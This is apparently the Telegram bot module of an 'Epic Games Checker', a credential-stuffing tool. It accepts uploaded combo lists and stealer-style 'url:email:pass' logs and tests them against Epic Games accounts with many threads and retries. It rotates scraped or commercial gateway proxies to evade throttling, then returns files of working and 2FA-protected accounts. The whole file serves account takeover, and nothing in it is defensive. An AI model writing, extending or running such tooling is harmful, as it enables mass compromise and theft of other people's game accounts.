"""
bot.py — Telegram bot handlers
"""
import asyncio
import io
import threading
import time

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters,
)

from config     import BOT_TOKEN, THREADS, MAX_RETRIES, GHOST_KEY, GHOST_USER, GHOST_HOST
from parser     import parse_ulp
from engine     import run_check, BUSY
from proxy_pool import pool as proxy_pool
from scraper    import scrape as scrape_proxies
from validator  import validate as validate_proxies


# ── /start & /help ────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎯 ULP File",   callback_data="mode_ulp"),
            InlineKeyboardButton("📋 Combo File", callback_data="mode_combo"),
        ]
    ])
    await update.message.reply_text(
        "🎮 *Epic Games Checker*\n\n"
        "What type of file are you sending?",
        parse_mode="Markdown",
        reply_markup=kb,
    )


# ── mode selection (inline button) ───────────────────────────────────────────

async def cb_mode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "mode_ulp":
        ctx.user_data["mode"] = "ulp"
        await query.edit_message_text(
            "✅ *ULP mode* selected\n\n"
            "Bot will extract Epic Games entries from your ULP file.\n"
            "_(format: `url:email:pass`)_\n\n"
            "📁 Send your `.txt` file now.",
            parse_mode="Markdown",
        )
    elif query.data == "mode_combo":
        ctx.user_data["mode"] = "combo"
        await query.edit_message_text(
            "✅ *Combo mode* selected\n\n"
            "Bot will check all `email:pass` lines in your file.\n\n"
            "📁 Send your `.txt` file now.",
            parse_mode="Markdown",
        )


# ── /mode — re-select mode anytime ───────────────────────────────────────────

async def cmd_mode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    current = ctx.user_data.get("mode", "not set")
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎯 ULP File",   callback_data="mode_ulp"),
            InlineKeyboardButton("📋 Combo File", callback_data="mode_combo"),
        ]
    ])
    await update.message.reply_text(
        f"Current mode: *{current}*\n\nSwitch to:",
        parse_mode="Markdown",
        reply_markup=kb,
    )


# ── /proxy — load proxies from a .txt file ───────────────────────────────────

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📡 Send me a `.txt` file with one proxy per line.\n\n"
        "Formats accepted:\n"
        "`ip:port`\n"
        "`ip:port:user:pass`\n"
        "`http://user:pass@ip:port`",
        parse_mode="Markdown",
    )
    ctx.user_data["awaiting_proxy"] = True


async def cmd_proxies(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    n = proxy_pool.count
    if n:
        await update.message.reply_text(f"📡 `{n}` proxies loaded (round-robin).", parse_mode="Markdown")
    else:
        await update.message.reply_text("📡 No proxies loaded — running direct.")


async def cmd_clear_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    proxy_pool.clear()
    await update.message.reply_text("🗑 Proxy list cleared.")


# ── /scrapeproxy — pull fresh proxies from GitHub + validate ─────────────────

async def cmd_scrape_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    loop       = asyncio.get_event_loop()
    status_msg = await update.message.reply_text(
        "🔍 Scraping proxies from GitHub...\n"
        "HTTP · SOCKS4 · SOCKS5 — this takes ~15s"
    )

    def _progress(msg: str):
        async def _edit():
            try:
                cur = status_msg.text or ""
                await status_msg.edit_text(cur + f"\n{msg}")
            except Exception:
                pass
        asyncio.run_coroutine_threadsafe(_edit(), loop)

    def _run():
        # step 1: scrape
        proxies, counts = scrape_proxies(progress_cb=_progress)
        total_scraped   = sum(counts.values())
        _progress(f"\n🧪 Validating {total_scraped} proxies — this takes 1-2 min...")

        # step 2: validate
        def _val_progress(tested, total, live):
            _progress(f"⏳ `{tested}/{total}` tested  |  ✅ live: `{live}`")

        live_proxies = validate_proxies(proxies, progress_cb=_val_progress)
        proxy_pool.load(live_proxies)

        total   = sum(counts.values())
        summary = (
            f"📡 *Proxy scrape + validate complete!*\n\n"
            f"🌐 HTTP:   `{counts.get('http',   0)}`\n"
            f"🔵 SOCKS4: `{counts.get('socks4', 0)}`\n"
            f"🟣 SOCKS5: `{counts.get('socks5', 0)}`\n"
            f"📦 Scraped: `{total}` total\n\n"
            f"✅ *Live & loaded: `{len(live_proxies)}`* (dead ones dropped)"
        )

        async def _done():
            try:
                await status_msg.edit_text(summary, parse_mode="Markdown")
            except Exception:
                await update.message.reply_text(summary, parse_mode="Markdown")
        asyncio.run_coroutine_threadsafe(_done(), loop)

    threading.Thread(target=_run, daemon=True).start()


# ── /ghostproxy ───────────────────────────────────────────────────────────────

async def cmd_ghostproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    ghostproxies.net is a GATEWAY service — not a proxy list.
    No download needed. Checker uses it automatically when GHOST_KEY is set.
    This command just shows current gateway status.
    """
    configured = GHOST_KEY and GHOST_KEY != "PASTE_YOUR_KEY_HERE"

    if not configured:
        await update.message.reply_text(
            "⚠️ *ghostproxies.net gateway not configured.*\n\n"
            "Open `config.py` and replace `PASTE_YOUR_KEY_HERE` with your API key,\n"
            "or set `GHOST_KEY` in Render dashboard → Environment.\n\n"
            "Get your key at: https://ghostproxies.net/dashboard",
            parse_mode="Markdown",
        )
        return

    # mask key for display — show first 8 chars only
    masked = GHOST_KEY[:8] + "..." + GHOST_KEY[-4:]

    await update.message.reply_text(
        f"✅ *ghostproxies.net gateway active*\n\n"
        f"🌐 Host:  `{GHOST_HOST}`\n"
        f"👤 User:  `{GHOST_USER}`\n"
        f"🔑 Key:   `{masked}`\n\n"
        f"The checker uses this gateway automatically.\n"
        f"Server-side rotation — no proxy list needed.",
        parse_mode="Markdown",
    )


# ── file handler — combo file OR proxy file ───────────────────────────────────

async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    msg  = update.message
    loop = asyncio.get_event_loop()
    doc: Document = msg.document

    if not doc.file_name.endswith(".txt"):
        await msg.reply_text("Send a `.txt` file.")
        return

    # download
    status_msg = await msg.reply_text("📥 Downloading...")
    file       = await doc.get_file()
    buf        = await file.download_as_bytearray()
    text       = buf.decode("utf-8", errors="replace")
    lines      = [l for l in text.splitlines() if l.strip()]

    # ── proxy file? ───────────────────────────────────────────────────────────
    if ctx.user_data.get("awaiting_proxy"):
        ctx.user_data["awaiting_proxy"] = False
        n = proxy_pool.load(lines)
        await status_msg.edit_text(f"📡 Loaded `{n}` proxies. Ready to check.", parse_mode="Markdown")
        return

    # ── no mode selected yet? ask first ──────────────────────────────────────
    mode = ctx.user_data.get("mode")
    if not mode:
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🎯 ULP File",   callback_data="mode_ulp"),
                InlineKeyboardButton("📋 Combo File", callback_data="mode_combo"),
            ]
        ])
        await status_msg.edit_text(
            "⚠️ Select file type first, then resend your file:",
            reply_markup=kb,
        )
        return

    # ── combo/ulp check ───────────────────────────────────────────────────────
    if uid in BUSY:
        await status_msg.edit_text("⏳ Already running a check. Wait for it to finish.")
        return

    epic_only = (mode == "ulp")
    combos    = parse_ulp(text, epic_only=epic_only)

    if not combos:
        await status_msg.edit_text(
            f"❌ No valid combos found in file.\n"
            f"_(mode: *{mode.upper()}*)_",
            parse_mode="Markdown",
        )
        return

    proxy_note = f"📡 `{proxy_pool.count}` proxies" if proxy_pool.count else "🌐 Direct (no proxy)"
    await status_msg.edit_text(
        f"📂 Mode: *{mode.upper()}*  |  {proxy_note}\n"
        f"🚀 Starting — `{THREADS}` threads | `{MAX_RETRIES}` retry passes\n"
        f"Total: `{len(combos)}`",
        parse_mode="Markdown",
    )

    BUSY.add(uid)
    start = time.time()

    # progress callback
    last_edit = [0.0]
    def progress(checked: int, total: int, stats: dict):
        now = time.time()
        if now - last_edit[0] < 2.0 and checked < total:
            return
        last_edit[0] = now
        elapsed = now - start
        cpm     = int(checked / elapsed * 60) if elapsed > 1 else 0
        txt     = (
            f"🔄 `{checked}/{total}` checked  |  `{cpm}` cpm\n"
            f"✅ HIT: `{stats.get('HIT',0)}`  "
            f"🔐 2FA: `{stats.get('2FA',0)}`  "
            f"❌ BAD: `{stats.get('BAD',0)}`  "
            f"💀 DEAD: `{stats.get('DEAD',0)}`\n"
            f"🔁 RETRY: `{stats.get('RETRY',0)}`  "
            f"⚠️ ERROR: `{stats.get('ERROR',0)}`"
        )
        async def _edit():
            try:
                await status_msg.edit_text(txt, parse_mode="Markdown")
            except Exception:
                pass
        asyncio.run_coroutine_threadsafe(_edit(), loop)

    # done callback
    def done(results: dict):
        BUSY.discard(uid)
        elapsed = time.time() - start

        async def _finish():
            hits   = results.get("HIT",   [])
            tfa    = results.get("2FA",   [])
            bad    = results.get("BAD",   [])
            dead   = results.get("DEAD",  [])
            errors = results.get("ERROR", [])
            retry  = results.get("RETRY", [])

            summary = (
                f"✅ *Check complete* in `{elapsed:.1f}s`\n"
                f"📂 Mode: *{mode.upper()}*\n\n"
                f"✅ HIT:   `{len(hits)}`\n"
                f"🔐 2FA:   `{len(tfa)}`\n"
                f"❌ BAD:   `{len(bad)}`\n"
                f"💀 DEAD:  `{len(dead)}`\n"
                f"⚠️ ERROR: `{len(errors)}`\n"
                f"🔁 RETRY: `{len(retry)}`"
            )
            await msg.reply_text(summary, parse_mode="Markdown")

            if hits:
                hit_buf      = io.BytesIO("\n".join(hits).encode())
                hit_buf.name = "HITS.txt"
                await msg.reply_document(hit_buf, caption=f"✅ {len(hits)} HITS")

            if tfa:
                tfa_buf      = io.BytesIO("\n".join(tfa).encode())
                tfa_buf.name = "2FA.txt"
                await msg.reply_document(tfa_buf, caption=f"🔐 {len(tfa)} 2FA")

            if retry:
                retry_buf      = io.BytesIO("\n".join(retry).encode())
                retry_buf.name = "RETRY.txt"
                await msg.reply_document(retry_buf, caption=f"🔁 {len(retry)} throttled — retry later or use proxies")

            if not hits and not tfa:
                await msg.reply_text("💀 No hits or 2FA accounts found.")

        asyncio.run_coroutine_threadsafe(_finish(), loop)

    threading.Thread(target=run_check, args=(combos, progress, done), daemon=True).start()


# ── app builder ───────────────────────────────────────────────────────────────

def build_app() -> Application:
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",        cmd_start))
    app.add_handler(CommandHandler("help",         cmd_start))
    app.add_handler(CommandHandler("mode",         cmd_mode))
    app.add_handler(CommandHandler("proxy",        cmd_proxy))
    app.add_handler(CommandHandler("proxies",      cmd_proxies))
    app.add_handler(CommandHandler("clearproxy",   cmd_clear_proxy))
    app.add_handler(CommandHandler("scrapeproxy",  cmd_scrape_proxy))
    app.add_handler(CommandHandler("ghostproxy",   cmd_ghostproxy))
    app.add_handler(CallbackQueryHandler(cb_mode,  pattern="^mode_"))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_file))
    return app
